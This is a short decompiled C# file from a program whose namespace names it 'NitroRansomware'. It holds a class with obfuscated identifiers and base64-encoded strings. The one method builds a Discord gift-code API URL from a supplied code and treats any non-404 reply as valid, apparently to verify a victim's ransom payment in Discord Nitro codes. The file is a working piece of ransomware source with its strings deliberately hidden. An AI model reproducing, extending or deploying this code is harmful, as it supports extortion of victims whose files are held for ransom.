using System;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace NitroRansomware;

internal class Nitro
{
	private static Logs gwTpRLe1B7OEFcNtAaXV難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化 = new Logs(Encoding.UTF8.GetString(Convert.FromBase64String("REVCVUc=")), 0);

	public static bool A479SWhnGqiWLNFgWalI(string code)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		HttpClient val = new HttpClient();
		try
		{
			string text = Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjgvZW50aXRsZW1lbnRzL2dpZnQtY29kZXMv")) + code + Encoding.UTF8.GetString(Convert.FromBase64String("P3dpdGhfYXBwbGljYXRpb249dHJ1ZSZ3aXRoX3N1YnNjcmlwdGlvbl9wbGFuPXRydWU="));
			gwTpRLe1B7OEFcNtAaXV難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.Y9DSOZGOOOIsdaYv6ZxN(text);
			Task<HttpResponseMessage> async = val.GetAsync(text);
			if (async.Result.get_StatusCode() != HttpStatusCode.NotFound)
			{
				return true;
			}
			return false;
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}
}
